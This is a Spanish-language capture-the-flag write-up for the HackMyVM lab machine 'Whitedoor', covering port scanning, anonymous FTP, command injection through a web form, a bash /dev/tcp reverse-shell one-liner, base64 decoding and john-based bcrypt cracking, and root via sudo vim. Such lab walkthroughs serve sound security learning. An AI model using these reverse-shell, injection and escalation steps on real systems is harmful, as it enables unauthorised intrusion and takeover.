---
title:      "Whitedoor"
excerpt:    "Hoy regresamos con otra máquina easy de HackMyVM creada por Pylon, donde hay una web que nos permitirá ejecutar comandos para conseguir un RCE"
toc:        true
toc_label:  "Tabla de contenidos"
toc_icon:   "key"
header:
  teaser: /assets/images/whitedoor/prev.png
  teaser_home_page: true
  icon: /assets/images/HMV.png
classes:    wide
categories:
  - HackMyVM
tags:  
  - Easy
  - Linux
  - Sudo abuse
  - Reverse shell
---

![](/assets/images/whitedoor/prev.png){: .align-center}

Hoy regresamos con otra máquina easy de HackMyVM creada por Pylon, donde hay una web que nos permitirá ejecutar comandos para conseguir un RCE.


## Reconocimiento de Puertos

Como siempre, empezaremos realizando el reconocimiento de puertos con un pequeño [script](https://github.com/KaianPerez/nmapauto.sh) que creé para automatizar este proceso inicial:

~~~bash
❯ sudo nmapauto

 [*] La IP de la máquina víctima es 192.168.1.28

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-15 19:00 CET
Initiating ARP Ping Scan at 19:00
Scanning 192.168.1.28 [1 port]
Completed ARP Ping Scan at 19:00, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:00
Scanning 192.168.1.28 [65535 ports]
Discovered open port 80/tcp on 192.168.1.28
Discovered open port 21/tcp on 192.168.1.28
Discovered open port 22/tcp on 192.168.1.28
Completed SYN Stealth Scan at 19:00, 1.69s elapsed (65535 total ports)
Nmap scan report for 192.168.1.28
Host is up, received arp-response (0.00036s latency).
Scanned at 2024-01-15 19:00:09 CET for 2s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:EF:A2:E7 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.99 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)

 [*] Escaneo avanzado de servicios

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-15 19:00 CET
Nmap scan report for 192.168.1.28
Host is up (0.00018s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              13 Nov 16 22:40 README.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.150
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 3d:85:a2:89:a9:c5:45:d0:1f:ed:3f:45:87:9d:71:a6 (ECDSA)
|_  256 07:e8:c5:28:5e:84:a7:b6:bb:d5:1d:2f:d8:92:6b:a6 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Home
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 08:00:27:EF:A2:E7 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds

 [*] Escaneo completado, se ha generado el fichero InfoPuertos 
~~~

Vamos en primer lugar a revisar el puerto 21, ya que tenemos acceso *anonymous*:

~~~bash
❯ ip=192.168.1.28
❯ ftp $ip
Connected to 192.168.1.28.
220 (vsFTPd 3.0.3)
Name (192.168.1.28:kaian): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||35116|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              13 Nov 16 22:40 README.txt
226 Directory send OK.
ftp> get README.txt
local: README.txt remote: README.txt
229 Entering Extended Passive Mode (|||22655|)
150 Opening BINARY mode data connection for README.txt (13 bytes).
100% |********************************************************************************************************************************************|    13       52.89 KiB/s    00:00 ETA
226 Transfer complete.
13 bytes received in 00:00 (25.39 KiB/s)
ftp> exit
221 Goodbye.
❯ cat README.txt
¡Good luck!
~~~

En este caso, como podemos observar solo vemos un fichero, el cual nos desea buena suerte.

Si revisamos el puerto 80:

![](/assets/images/whitedoor/index.png){: .align-center}

Parece que solo nos deja usar "ls":

![](/assets/images/whitedoor/ls.png){: .align-center}

Revisemos ese fichero php sospechoso:

![](/assets/images/whitedoor/blackdoor.png){: .align-center}


### Reverse shell

> Quería puntualizar que en el propio index, podemos ejecutar otros comandos utilizando la "trampa" para separar múltiples comandos en una sola línea, utilizando ";". De forma que podríamos poner "ls; id" y se interpretarían correctamente ambos comandos.

Aquí sí nos permite usar cualquier comando, así que de esta forma, nos ponemos como siempre a la escucha con:

`nc -nlvp 1243` 

y tratamos de entablar una reverse shell introduciendo en la caja del navegador:

`bash -c "/bin/bash -i >& /dev/tcp/192.168.1.150/1234 0>&1"` 

Tras esto conseguimos el RCE y acto seguido realizamos el [tratamiento de la TTY](https://kaianperez.github.io/tty/).

Ahora nos vamos directamente a */home* y revisamos qué directorios de trabajo y permisos tenemos:

~~~bash
www-data@whitedoor:/home$ ls -la
total 16
drwxr-xr-x  4 root       root       4096 Nov 16 16:58 .
drwxr-xr-x 18 root       root       4096 Nov 15 23:05 ..
drwxr-x---  9 Gonzalo    whiteshell 4096 Nov 17 18:11 Gonzalo
drwxr-xr-x  9 whiteshell whiteshell 4096 Nov 17 18:47 whiteshell
~~~

Como en *Gonzalo* no tenemos permisos, vamos a revisar *whiteshell*:

~~~bash
www-data@whitedoor:/home$ cd whiteshell/
www-data@whitedoor:/home/whiteshell$ ls -laR
.:
total 48
drwxr-xr-x 9 whiteshell whiteshell 4096 Nov 17 18:47 .
drwxr-xr-x 4 root       root       4096 Nov 16 16:58 ..
lrwxrwxrwx 1 root       root          9 Nov 16 00:43 .bash_history -> /dev/null
-rw-r--r-- 1 whiteshell whiteshell  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 whiteshell whiteshell 3526 Apr 23  2023 .bashrc
drwxr-xr-x 3 whiteshell whiteshell 4096 Nov 16 17:05 .local
-rw-r--r-- 1 whiteshell whiteshell  807 Apr 23  2023 .profile
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 18:43 Desktop
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 17:08 Documents
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 17:08 Downloads
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 17:08 Music
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 17:08 Pictures
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 17:08 Public

./.local:
total 12
drwxr-xr-x 3 whiteshell whiteshell 4096 Nov 16 17:05 .
drwxr-xr-x 9 whiteshell whiteshell 4096 Nov 17 18:47 ..
drwx------ 3 whiteshell whiteshell 4096 Nov 16 17:05 share
ls: cannot open directory './.local/share': Permission denied

./Desktop:
total 12
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 18:43 .
drwxr-xr-x 9 whiteshell whiteshell 4096 Nov 17 18:47 ..
-r--r--r-- 1 whiteshell whiteshell   56 Nov 16 09:07 .my_secret_password.txt

./Documents:
total 8
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 17:08 .
drwxr-xr-x 9 whiteshell whiteshell 4096 Nov 17 18:47 ..

./Downloads:
total 8
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 17:08 .
drwxr-xr-x 9 whiteshell whiteshell 4096 Nov 17 18:47 ..

./Music:
total 8
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 17:08 .
drwxr-xr-x 9 whiteshell whiteshell 4096 Nov 17 18:47 ..

./Pictures:
total 8
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 17:08 .
drwxr-xr-x 9 whiteshell whiteshell 4096 Nov 17 18:47 ..

./Public:
total 8
drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 17:08 .
drwxr-xr-x 9 whiteshell whiteshell 4096 Nov 17 18:47 ..
~~~

Hemos descubierto un fichero oculto que parece interesante:

~~~
www-data@whitedoor:/home/whiteshell$ cat Desktop/.my_secret_password.txt
whiteshell:VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K
~~~

Parece que está en base64, vamos a decodificarlo:

~~~bash
❯ echo "VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K" | base64 -d
VGgxc0lzVGgzUDRzU3dPckRibGFjNQo=
❯ echo "VGgxc0lzVGgzUDRzU3dPckRibGFjNQo=" | base64 -d
Th******************5
~~~

Bien, parece que ya podemos pivotar al usuario *whiteshell*, de esta forma, ahora ya podemos revisar el directorio de *Gonzalo* porque teníamos permisos de grupo:

~~~bash
www-data@whitedoor:/home/whiteshell$ su whiteshell
Password: 
whiteshell@whitedoor:~$ cd ../Gonzalo/
whiteshell@whitedoor:/home/Gonzalo$ ls -laR
.:
total 52
drwxr-x--- 9 Gonzalo whiteshell 4096 Nov 17 18:11 .
drwxr-xr-x 4 root    root       4096 Nov 16 16:58 ..
-rw------- 1 Gonzalo Gonzalo     718 Nov 17 20:06 .bash_history
-rw-r--r-- 1 Gonzalo Gonzalo     220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 Gonzalo Gonzalo    3526 Apr 23  2023 .bashrc
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17 19:26 Desktop
drwxr-xr-x 2 root    Gonzalo    4096 Nov 16 21:04 Documents
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17 18:09 Downloads
drwxr-xr-x 3 Gonzalo Gonzalo    4096 Nov 16 17:03 .local
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17 18:11 Music
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17 18:07 Pictures
-rw-r--r-- 1 Gonzalo Gonzalo     807 Apr 23  2023 .profile
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17 18:09 Public

./Desktop:
total 16
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17 19:26 .
drwxr-x--- 9 Gonzalo whiteshell 4096 Nov 17 18:11 ..
-r--r--r-- 1 root    root         61 Nov 16 20:49 .my_secret_hash
-rw-r----- 1 root    Gonzalo      20 Nov 16 21:54 user.txt

./Documents:
total 8
drwxr-xr-x 2 root    Gonzalo    4096 Nov 16 21:04 .
drwxr-x--- 9 Gonzalo whiteshell 4096 Nov 17 18:11 ..

./Downloads:
total 8
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17 18:09 .
drwxr-x--- 9 Gonzalo whiteshell 4096 Nov 17 18:11 ..

./.local:
total 12
drwxr-xr-x 3 Gonzalo Gonzalo    4096 Nov 16 17:03 .
drwxr-x--- 9 Gonzalo whiteshell 4096 Nov 17 18:11 ..
drwx------ 3 Gonzalo Gonzalo    4096 Nov 16 17:03 share
ls: cannot open directory './.local/share': Permission denied

./Music:
total 8
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17 18:11 .
drwxr-x--- 9 Gonzalo whiteshell 4096 Nov 17 18:11 ..

./Pictures:
total 8
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17 18:07 .
drwxr-x--- 9 Gonzalo whiteshell 4096 Nov 17 18:11 ..

./Public:
total 8
drwxr-xr-x 2 root    Gonzalo    4096 Nov 17 18:09 .
drwxr-x--- 9 Gonzalo whiteshell 4096 Nov 17 18:11 ..
~~~

Hemos localizado 2 ficheros en "Desktop", pero todavía no podemos leer la flag:

~~~
whiteshell@whitedoor:/home/Gonzalo$ cd Desktop/
whiteshell@whitedoor:/home/Gonzalo/Desktop$ cat .my_secret_hash 
$2y$10$CqtC7h0oOG5sir4oUFxkGuKzS561UFos6F7hL31Waj/Y48ZlAbQF6
~~~


### Crackeando hash

Parece que hemos localizado un hash, vamos a tratar de crackearlo en la máquina atacante:

Copiamos el hash en un fichero llamado "hash" y usamos john:

~~~bash
❯ john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
q********p       (?)     
1g 0:00:00:01 DONE (2024-01-15 20:26) 0.8000g/s 302.4p/s 302.4c/s 302.4C/s strawberry..metallica
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
~~~

Parece que ya tenemos la contraseña de *Gonzalo*, así que vamos a por la flag de user:

~~~bash
whiteshell@whitedoor:/home/Gonzalo/Desktop$ su Gonzalo 
Password: 
Gonzalo@whitedoor:~/Desktop$ cat user.txt 
Y0*************g!!
~~~


## Escalada de privilegios

Ahora vamos ya a por la de root, así que vamos a revisar los comandos que podemos ejecutar como otros usuarios:

~~~bash
Gonzalo@whitedoor:~/Desktop$ sudo -l
Matching Defaults entries for Gonzalo on whitedoor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User Gonzalo may run the following commands on whitedoor:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
~~~

Podemos usar vim como *root*, así que si nos vamos a junto nuestro gran amigo <https://gtfobins.github.io/gtfobins/vim/#sudo> para poder escalar privilegios fácilmente:

~~~bash
Gonzalo@whitedoor:~/Desktop$ sudo vim -c ':!/bin/bash'

root@whitedoor:/home/Gonzalo/Desktop# whoami
root
root@whitedoor:/home/Gonzalo/Desktop# cd /root
root@whitedoor:~# ls
root.txt
root@whitedoor:~# cat root.txt 
Y0******************T!!
~~~

Con esto finalizamos la máquina, agradecer a Pylon por la misma. Nos vemos en la siguiente.